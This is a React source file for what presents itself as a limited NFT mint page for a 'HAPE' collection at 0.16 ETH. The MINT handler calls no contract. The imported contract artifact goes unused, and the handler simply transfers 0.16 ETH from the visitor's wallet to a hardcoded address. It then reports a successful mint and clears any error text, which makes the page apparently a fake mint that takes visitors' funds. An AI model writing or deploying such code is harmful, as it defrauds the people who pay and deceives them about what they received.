import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import Wallet from './artifacts/contracts/Wallet.sol/Wallet.json';
import logo from './images/logo.png';
import collection from './images/hape.gif'
import './App.css';

let WalletAddress = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199";

function App() {

  
  const [amountSend] = useState('0.16');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  
  async function transfer() {
    if(!amountSend) {
      return;
    }

    setError('');
    setSuccess('');
    if(typeof window.ethereum !== 'undefined') {
      const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      try {
        const tx = {
          from: accounts[0],
          to: WalletAddress,
          value: ethers.utils.parseEther(amountSend)
        }
        const transaction = await signer.sendTransaction(tx);
        await transaction.wait();
       
        setSuccess('Vous avez mint 1 HAPE! ')
      }
      catch(err) {
        setError('');
      }
    }
  }
  

  return (

    
    <div className="App">
 
      <div className="header">
          <img src={logo} alt="img" />
      </div>
       
      <div className="container">

        {error && <p className="error">{error}</p>}
        {success && <p className="success">{success}</p>}
        
        <div className="wallet__flex">
          <div className="walletG">
            <h3>Limited Mint Date</h3>
            <h3>March 1 - 11am EST</h3>
            <div className="infoBar">
              <div className="infoBar-item"><h4><b>Supply</b></h4> <br/> 777</div>
              <div className="infoBar-item"><h4><b>Price</b></h4> <br/> 0.16 ETH</div>
              <div className="infoBar-item"><h4><b>Max</b></h4> <br/> 10 per Wallet</div>
            </div>
            <div className="tabContain">
              <div className="tab">
                <div className="tab-item">
                  <h3>LIMITED SALE</h3>
                </div>
                <div className="tab-item">
                  <div className="tab-item-product">
                    <div className="tab-item2">
                      <h4><img src={collection} className="img"/></h4>
                    </div>
                    <div className="tab-item2">
                      <h4>Price Per NFT</h4><br/><b>0.16 ETH </b>
                    </div>
                  </div>
                </div>
                <div className="tab-item">
                  <button onClick={transfer}>MINT</button>
                </div>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}

export default App;